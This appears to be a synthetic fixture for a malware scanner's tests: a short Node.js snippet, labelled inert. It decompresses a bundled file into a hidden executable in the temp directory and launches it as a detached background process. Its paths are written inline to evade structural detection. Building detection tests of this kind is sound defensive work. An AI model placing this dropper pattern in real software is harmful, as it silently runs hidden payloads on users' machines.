// SYNTHETIC FIXTURE — inert loader body. Scored as text, never executed. Evasion
// closure: write-path and launch-path are repeated inline `path.join(...)`
// expressions (no shared identifier) — S3 structural matching.
const fs = require("fs"), zlib = require("zlib"), cp = require("child_process"), os = require("os"), path = require("path");
fs.writeFileSync(path.join(os.tmpdir(), ".x"), zlib.gunzipSync(fs.readFileSync(path.join(__dirname, "p.js"))));
fs.chmodSync(path.join(os.tmpdir(), ".x"), 0o755);
cp.spawn(path.join(os.tmpdir(), ".x"), [], { detached: true }).unref();
